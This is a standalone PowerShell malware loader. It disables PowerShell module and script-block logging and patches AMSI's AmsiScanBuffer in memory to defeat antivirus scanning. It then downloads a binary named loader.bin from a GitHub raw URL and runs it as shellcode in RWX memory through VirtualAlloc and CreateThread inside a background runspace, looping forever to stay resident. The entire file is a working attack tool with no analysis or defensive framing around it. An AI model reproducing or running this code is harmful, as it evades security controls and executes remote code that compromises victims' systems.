# Minimize logging by disabling module logging and script block logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell" -Name "EnableModuleLogging" -Value 0 -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell" -Name "EnableScriptBlockLogging" -Value 0 -ErrorAction SilentlyContinue

# Bypass AMSI temporarily
$amsiBypass = @"
using System;
using System.Runtime.InteropServices;
public class AmsiBypass {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $amsiBypass -ErrorAction SilentlyContinue
try {
    $lib = [AmsiBypass]::LoadLibrary("amsi.dll")
    $addr = [AmsiBypass]::GetProcAddress($lib, "AmsiScanBuffer")
    [UInt32]$oldProtect = 0
    [AmsiBypass]::VirtualProtect($addr, [UInt32]5, 0x40, [Ref]$oldProtect)
    $buf = [Byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, 6)
} catch {}

function Get-WebContent {
    param([string]$Url)
    
    try {
        # Use different methods to download content
        $client = New-Object System.Net.WebClient
        $client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        return $client.DownloadData($Url)
    }
    catch {
        try {
            # Fallback method using HttpClient
            Add-Type -AssemblyName System.Net.Http
            $handler = New-Object System.Net.Http.HttpClientHandler
            $httpClient = New-Object System.Net.Http.HttpClient($handler)
            $httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            $task = $httpClient.GetByteArrayAsync($Url)
            $task.Wait()
            return $task.Result
        }
        catch {
            # Final fallback using Invoke-WebRequest
            $response = Invoke-WebRequest -Uri $Url -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -UseBasicParsing
            return $response.Content
        }
    }
}

function Invoke-Shellcode {
    param([Byte[]]$Shellcode)
    
    # Get necessary WinAPI functions
    $win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
    
    Add-Type $win32
    
    # Allocate memory with EXECUTE_READWRITE permissions
    $baseAddr = [Win32]::VirtualAlloc([IntPtr]::Zero, [UInt32]$Shellcode.Length, 0x3000, 0x40)
    
    if ($baseAddr -eq [IntPtr]::Zero) {
        throw "Memory allocation failed"
    }
    
    # Copy shellcode to allocated memory
    [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $baseAddr, $Shellcode.Length)
    
    # Ensure memory is executable
    [UInt32]$oldProtect = 0
    [Win32]::VirtualProtect($baseAddr, [UIntPtr]$Shellcode.Length, 0x40, [Ref]$oldProtect) | Out-Null
    
    # Create and execute thread
    $threadHandle = [Win32]::CreateThread([IntPtr]::Zero, 0, $baseAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
    
    if ($threadHandle -eq [IntPtr]::Zero) {
        throw "Thread creation failed"
    }
    
    # Wait indefinitely for the thread to complete
    [Win32]::WaitForSingleObject($threadHandle, 0xFFFFFFFF) | Out-Null
    
    return $threadHandle
}

function Start-PersistentShellcode {
    param([string]$ShellcodeUrl)
    
    Write-Host "Downloading shellcode from: $ShellcodeUrl" -ForegroundColor Yellow
    
    try {
        # Download shellcode in memory
        $shellcodeBytes = Get-WebContent -Url $ShellcodeUrl
        
        if ($shellcodeBytes -eq $null -or $shellcodeBytes.Length -eq 0) {
            throw "Failed to download shellcode or empty content"
        }
        
        Write-Host "Shellcode downloaded successfully, size: $($shellcodeBytes.Length) bytes" -ForegroundColor Green
        Write-Host "Executing shellcode..." -ForegroundColor Yellow
        
        # Execute shellcode in a separate runspace to maintain persistence
        $runspace = [runspacefactory]::CreateRunspace()
        $runspace.Open()
        $ps = [powershell]::Create()
        $ps.Runspace = $runspace
        
        # Add script to runspace
        [void]$ps.AddScript({
            param($Bytes, $InvokeShellcodeScript)
            
            # Recreate the Invoke-Shellcode function in the runspace
            Invoke-Expression $InvokeShellcodeScript
            Invoke-Shellcode -Shellcode $Bytes
        }).AddArgument($shellcodeBytes).AddArgument($Function:Invoke-Shellcode.ToString())
        
        # Execute asynchronously
        $handle = $ps.BeginInvoke()
        
        Write-Host "Shellcode executed in separate runspace. Process will remain active." -ForegroundColor Green
        
        # Keep the main process alive
        while ($true) {
            if ($ps.InvocationStateInfo.State -eq "Failed") {
                Write-Host "Shellcode execution failed: $($ps.InvocationStateInfo.Reason)" -ForegroundColor Red
                break
            }
            Start-Sleep -Seconds 30
        }
    }
    catch {
        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Main execution
try {
    $shellcodeUrl = "https://github.com/xekze0102-art/b64a/raw/refs/heads/main/loader.bin"
    
    # Start the shellcode execution
    Start-PersistentShellcode -ShellcodeUrl $shellcodeUrl
}
catch {
    # Minimal error output
    exit
}

# Keep process alive indefinitely
while ($true) {
    Start-Sleep -Seconds 60
}
